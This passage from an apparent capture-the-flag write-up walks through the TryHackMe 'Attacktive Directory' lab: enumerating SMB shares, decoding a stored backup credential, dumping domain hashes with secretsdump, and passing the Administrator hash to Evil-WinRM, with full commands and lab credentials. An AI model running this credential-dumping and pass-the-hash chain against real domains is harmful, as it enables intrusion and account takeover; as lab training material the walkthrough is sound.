          -U svc-admin%management2005
```

Which gives us the following output.

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to THM-AD failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

There's six shares, but only five of these are disks. We'll poke around a bit using `smbclient //THM-AD/${SHARENAME} -I 10.10.177.198 -U svc-admin%management2005`; as one might guess, //THM-AD/backup contains a `backup_credentials.txt` file.

The contents of this file naively appear to be base64 encoded, and indeed piping it through `base64 -d` reveals that the password for the `backup` account is `backup2517860`.

We'll again pause to connect to the target as `backup` to get the second flag.

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore \
         /v:10.10.177.198 /u:backup /p:backup2517860
```

This flag is in a file called `PrivEsc` on `backup`'s desktop.

* [Enumerate Samba Users and Shares](../Notes/Enumerate%20Samba%20Users%20and%20Shares.md)

## Elevating Privileges Within the Domain

The CTF now reveals that the `backup` account has all AD changes synced to it, including NT hashes, and that we can use Impacket's secretsdump.py file to obtain these from NTDS.DIT.

```bash
python3 \
/usr/share/doc/python3-impacket/examples/secretsdump.py \
-dc-ip 10.10.177.198 \
-target-ip 10.10.177.198 \
spookysec.local/backup:backup2517860@THM-AD
```

(I got a bit tripped up here, as I didn't read secretsdump.py's output carefully enough — credentials are presented in the format `domain\uid:rid:lmhash:nthash`, so the relevant NTLM hash is the *last* hash for the `Administrator` account!)

We'll use the Evil-WinRM tool to retrieve the final flag by passing the hash.

```bash
evil-winrm --ip 10.10.177.198 --user Administrator \
           --hash 0e0363213e37b94221497260b0bcb4fc
```

The final flag is in a file called `root.txt` on the `Administrator` account's desktop.

* [Pass the hash (Wikipedia)](https://en.wikipedia.org/wiki/Pass_the_hash)

ELAPSED TIME: 2 h 38 min

## References

* [TryHackMe: Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
